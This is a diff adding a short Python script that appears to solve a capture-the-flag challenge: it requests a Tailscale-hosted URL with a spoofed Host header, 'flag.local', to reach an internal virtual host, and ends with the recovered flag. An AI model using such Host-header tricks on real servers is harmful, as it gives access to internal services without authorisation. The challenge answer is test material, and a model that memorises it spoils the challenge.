@@ -1,0 +1,9 @@
+import requests
+
+url = 'https://pioneer.tailec718.ts.net/'
+
+r = requests.get(url, headers={'Host': 'flag.local'}) 
+print(r.text)
+
+
+actf{reaching_the_core__chapter_8}
